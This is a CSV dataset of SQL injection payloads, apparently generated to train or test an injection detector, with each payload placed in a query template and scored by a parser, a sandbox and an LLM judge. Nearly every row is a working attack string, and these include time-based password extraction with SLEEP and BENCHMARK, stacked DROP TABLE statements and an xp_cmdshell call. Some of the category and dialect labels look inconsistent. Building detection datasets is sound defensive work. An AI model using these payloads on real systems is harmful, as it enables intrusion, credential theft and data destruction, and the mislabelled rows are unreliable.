query_id,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_reason
q01141,-1 OR (SELECT 1 FROM (SELECT 1 WHERE USER != 'admin'))#,SELECT * FROM users WHERE id = -1 OR (SELECT 1 FROM (SELECT 1 WHERE USER != 'admin'))#,blind_boolean,user_lookup,1,0,0.0,True,mysql,"[""Identifier"", ""NEQ"", ""Literal"", ""Or"", ""Neg"", ""From"", ""Subquery"", ""Where"", ""Column"", ""Select""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01142,"' AND 1=(SELECT COUNT(*) FROM users WHERE SUBSTRING(username, 1, 1) = 'a') --","SELECT * FROM users WHERE id = ' AND 1=(SELECT COUNT(*) FROM users WHERE SUBSTRING(username, 1, 1) = 'a') --",blind_boolean,user_lookup,1,0,0.0,True,default,"[""Identifier"", ""And"", ""EQ"", ""Count"", ""Table"", ""Star"", ""Literal"", ""From"", ""Subquery"", ""Where"", ""Substring"", ""Column"", ""Select""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01143,' OR 1<>(SELECT 0 FROM (SELECT 0 FROM users WHERE password != '' LIMIT 1)),SELECT * FROM users WHERE id = ' OR 1<>(SELECT 0 FROM (SELECT 0 FROM users WHERE password != '' LIMIT 1)),blind_boolean,user_lookup,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""NEQ"", ""Limit"", ""Table"", ""Star"", ""Literal"", ""Or"", ""From"", ""Subquery"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01144,"1 AND 1=(SELECT IIF(SUBSTRING((SELECT user_name FROM sysusers WHERE user_id=1), 1, 1)='sa', 1, 0))--","SELECT * FROM orders WHERE status = '1 AND 1=(SELECT IIF(SUBSTRING((SELECT user_name FROM sysusers WHERE user_id=1), 1, 1)='sa', 1, 0))--' ORDER BY date DESC",blind_boolean,order_filter,1,0,0.0,True,default,"[""Identifier"", ""And"", ""EQ"", ""Table"", ""Literal"", ""If"", ""From"", ""Subquery"", ""Where"", ""Substring"", ""Column"", ""Select""]",True,complete_query,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01145,' OR EXISTS(SELECT 1 FROM users WHERE username IS NOT NULL) --,SELECT * FROM orders WHERE status = '' OR EXISTS(SELECT 1 FROM users WHERE username IS NOT NULL) --' ORDER BY date DESC,blind_boolean,order_filter,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""Null"", ""Table"", ""Star"", ""Literal"", ""Exists"", ""Is"", ""From"", ""Or"", ""Where"", ""Not"", ""Column"", ""Select""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01146,1' AND (SELECT CASE WHEN CHAR_LENGTH((SELECT database() FROM information_schema)) > 0 THEN 1 ELSE 0 END) --,SELECT * FROM orders WHERE status = '1' AND (SELECT CASE WHEN CHAR_LENGTH((SELECT database() FROM information_schema)) > 0 THEN 1 ELSE 0 END) --' ORDER BY date DESC,blind_boolean,order_filter,1,0,0.0,True,mysql,"[""Identifier"", ""And"", ""EQ"", ""Length"", ""GT"", ""Table"", ""Star"", ""Literal"", ""CurrentSchema"", ""Case"", ""If"", ""From"", ""Subquery"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01147,' OR (SELECT COUNT(*) FROM users WHERE id = (SELECT 1 FROM (SELECT 1 UNION ALL SELECT NULL))) --,SELECT * FROM orders WHERE status = '' OR (SELECT COUNT(*) FROM users WHERE id = (SELECT 1 FROM (SELECT 1 UNION ALL SELECT NULL))) --' ORDER BY date DESC,blind_boolean,order_filter,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""Union"", ""Count"", ""Null"", ""Table"", ""Star"", ""Literal"", ""Or"", ""From"", ""Subquery"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01148,"' OR (SELECT IF(LENGTH((SELECT CONCAT(first_name, last_name) FROM employees WHERE employee_id = 1)) > 0, 1, 0)) #","SELECT * FROM orders WHERE status = '' OR (SELECT IF(LENGTH((SELECT CONCAT(first_name, last_name) FROM employees WHERE employee_id = 1)) > 0, 1, 0)) #' ORDER BY date DESC",blind_boolean,order_filter,1,0,0.0,True,mysql,"[""Identifier"", ""EQ"", ""Length"", ""GT"", ""Table"", ""Star"", ""Literal"", ""Or"", ""If"", ""From"", ""Subquery"", ""Where"", ""Column"", ""Select"", ""Concat""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01149,"1'; DECLARE @a INT; SET @a = 1; WHILE @a <= (SELECT COUNT(id) FROM products) BEGIN IF (SUBSTRING((SELECT product_name FROM products WHERE id = @a), 1, 1) = 'A') PRINT 'Injection Success'; SET @a = @a + 1 END --","SELECT * FROM orders WHERE status = '1'; DECLARE @a INT; SET @a = 1; WHILE @a <= (SELECT COUNT(id) FROM products) BEGIN IF (SUBSTRING((SELECT product_name FROM products WHERE id = @a), 1, 1) = 'A') PRINT 'Injection Success'; SET @a = @a + 1 END --' ORDER BY date DESC",blind_boolean,order_filter,1,0,0.0,True,tsql,"[""Declare"", ""Parameter"", ""Alias"", ""Column"", ""Star"", ""Identifier"", ""Add"", ""Set"", ""Table"", ""SetItem"", ""Literal"", ""From"", ""Select"", ""IfBlock"", ""Command"", ""Block"", ""DeclareItem"", ""Var"", ""DataType"", ""Substring"", ""EQ"", ""WhileBlock"", ""Count"", ""LTE"", ""Subquery"", ""Where""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01150,' OR 1=CAST((BINARY(0x31)) AS UNSIGNED) --,SELECT * FROM orders WHERE status = '' OR 1=CAST((BINARY(0x31)) AS UNSIGNED) --' ORDER BY date DESC,blind_boolean,order_filter,1,0,0.0,True,mysql,"[""Identifier"", ""Paren"", ""EQ"", ""Anonymous"", ""Cast"", ""Table"", ""Star"", ""HexString"", ""Literal"", ""DataType"", ""Or"", ""From"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01151,/*' OR */ 1=1 /**/,SELECT * FROM orders WHERE status = '/*' OR */ 1=1 /**/' ORDER BY date DESC,blind_boolean,order_filter,1,0,0.0,True,default,"[""EQ"", ""Literal""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01152,"' OR ASCII(SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1))>97 --","SELECT * FROM orders WHERE status = '' OR ASCII(SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1))>97 --' ORDER BY date DESC",blind_boolean,order_filter,1,0,0.0,True,default,"[""Identifier"", ""Subquery"", ""EQ"", ""GT"", ""Limit"", ""Table"", ""Star"", ""Literal"", ""Or"", ""From"", ""Ascii"", ""Where"", ""Substring"", ""Column"", ""Select""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01153,' OR 1=CASE WHEN (SELECT 1 FROM dual WHERE 1=1) THEN 1 ELSE 0 END --,SELECT * FROM orders WHERE status = '' OR 1=CASE WHEN (SELECT 1 FROM dual WHERE 1=1) THEN 1 ELSE 0 END --' ORDER BY date DESC,blind_boolean,order_filter,1,0,0.0,True,default,"[""Identifier"", ""Subquery"", ""EQ"", ""Table"", ""Star"", ""Literal"", ""Case"", ""If"", ""From"", ""Or"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01154,' OR EXISTS(SELECT * FROM users WHERE username='admin') --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR EXISTS(SELECT * FROM users WHERE username='admin') --')",blind_boolean,comment_insert,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""Table"", ""Star"", ""Literal"", ""Exists"", ""Or"", ""From"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01156,'; DROP TABLE IF EXISTS temp; --,"INSERT INTO comments (user_id, body) VALUES (1, ''; DROP TABLE IF EXISTS temp; --')",blind_boolean,comment_insert,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""Drop"", ""Table"", ""Semicolon"", ""Star"", ""Literal"", ""From"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01157,"--' UNION SELECT NULL, NULL --","INSERT INTO comments (user_id, body) VALUES (1, '--' UNION SELECT NULL, NULL --')",blind_boolean,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01158,"--' AND LENGTH((SELECT user FROM users WHERE id=1)) > 0""","INSERT INTO comments (user_id, body) VALUES (1, '--' AND LENGTH((SELECT user FROM users WHERE id=1)) > 0""')",blind_boolean,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01160,"; EXEC xp_cmdshell ('ping -n 5 127.0.0.1')"" + ""' --""","INSERT INTO comments (user_id, body) VALUES (1, '; EXEC xp_cmdshell ('ping -n 5 127.0.0.1')"" + ""' --""')",blind_boolean,comment_insert,1,0,0.0,True,postgres,"[""Identifier"", ""EQ"", ""Command"", ""Table"", ""Literal"", ""From"", ""Where"", ""Star"", ""Select""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01161,"; SELECT SLEEP(5)"" + ""'#","INSERT INTO comments (user_id, body) VALUES (1, '; SELECT SLEEP(5)"" + ""'#')",blind_boolean,comment_insert,1,0,0.0,True,mysql,"[""Identifier"", ""EQ"", ""Table"", ""Star"", ""Literal"", ""From"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01162,"' OR IF(ASCII(SUBSTRING(password,1,1)) > 90,SLEEP(5),NULL)--","SELECT * FROM users WHERE username = '' OR IF(ASCII(SUBSTRING(password,1,1)) > 90,SLEEP(5),NULL)--' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""Anonymous"", ""GT"", ""Null"", ""Table"", ""Star"", ""Literal"", ""Or"", ""If"", ""From"", ""Ascii"", ""Where"", ""Substring"", ""Column"", ""Select""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01163,"' AND BENCHMARK((SELECT ASCII(SUBSTRING(username,1,1))),SHA1('a'))--","SELECT * FROM users WHERE username = '' AND BENCHMARK((SELECT ASCII(SUBSTRING(username,1,1))),SHA1('a'))--' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""Identifier"", ""And"", ""EQ"", ""Anonymous"", ""Subquery"", ""SHA"", ""Table"", ""Star"", ""Literal"", ""From"", ""Ascii"", ""Where"", ""Substring"", ""Column"", ""Select""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01164,") UNION SELECT NULL,CONCAT(MID(password,1,1),MID(password,2,1)),NULL,NULL FROM users WHERE SUBSTRING(username,1,1) LIKE 'A'--","SELECT * FROM users WHERE username = ') UNION SELECT NULL,CONCAT(MID(password,1,1),MID(password,2,1)),NULL,NULL FROM users WHERE SUBSTRING(username,1,1) LIKE 'A'--' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""Identifier"", ""Paren"", ""EQ"", ""Anonymous"", ""Union"", ""Like"", ""Null"", ""Table"", ""Star"", ""Literal"", ""From"", ""Where"", ""Substring"", ""Column"", ""Select"", ""Concat""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01165,"' AND (SELECT 1 FROM (SELECT CASE WHEN ASCII(SUBSTRING(password,1,1)) > 90 THEN SLEEP(5) ELSE NULL END AS result)) --","SELECT * FROM users WHERE username = '' AND (SELECT 1 FROM (SELECT CASE WHEN ASCII(SUBSTRING(password,1,1)) > 90 THEN SLEEP(5) ELSE NULL END AS result)) --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""Alias"", ""Null"", ""Ascii"", ""Star"", ""Column"", ""Identifier"", ""And"", ""Table"", ""Literal"", ""Case"", ""From"", ""Select"", ""GT"", ""If"", ""Substring"", ""EQ"", ""Anonymous"", ""Subquery"", ""Where""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01167,"' AND EXISTS(SELECT * FROM users WHERE SUBSTRING(password,1,1) = CHAR(65)) --","SELECT * FROM users WHERE username = '' AND EXISTS(SELECT * FROM users WHERE SUBSTRING(password,1,1) = CHAR(65)) --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""Identifier"", ""And"", ""EQ"", ""Chr"", ""Table"", ""Star"", ""Literal"", ""Exists"", ""From"", ""Where"", ""Substring"", ""Column"", ""Select""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01169,"' AND 1=2 UNION ALL SELECT NULL,CONCAT(CAST(SLEEP(5) AS CHAR),''),NULL FROM users --","SELECT * FROM users WHERE username = '' AND 1=2 UNION ALL SELECT NULL,CONCAT(CAST(SLEEP(5) AS CHAR),''),NULL FROM users --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""Identifier"", ""And"", ""EQ"", ""Anonymous"", ""Union"", ""Cast"", ""Null"", ""Table"", ""Star"", ""Literal"", ""DataType"", ""From"", ""Where"", ""Column"", ""Select"", ""Concat""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01170,' OR (SELECT 1 FROM information_schema.tables WHERE table_name LIKE '%users%' AND table_schema = DATABASE()) --,SELECT * FROM users WHERE username = '' OR (SELECT 1 FROM information_schema.tables WHERE table_name LIKE '%users%' AND table_schema = DATABASE()) --' AND password = 'anything',blind_time,login,1,0,0.0,True,mysql,"[""Identifier"", ""And"", ""EQ"", ""Like"", ""Table"", ""Star"", ""Literal"", ""CurrentSchema"", ""Or"", ""From"", ""Subquery"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01171,"' AND 1=2 OR EXISTS(SELECT * FROM users WHERE CAST(BENCHMARK(1000000,CURRENT_DATE) AS CHAR) <> '') --","SELECT * FROM users WHERE username = '' AND 1=2 OR EXISTS(SELECT * FROM users WHERE CAST(BENCHMARK(1000000,CURRENT_DATE) AS CHAR) <> '') --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""Identifier"", ""And"", ""EQ"", ""Anonymous"", ""NEQ"", ""Cast"", ""Table"", ""Star"", ""Literal"", ""DataType"", ""Exists"", ""Or"", ""From"", ""Where"", ""CurrentDate"", ""Column"", ""Select""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
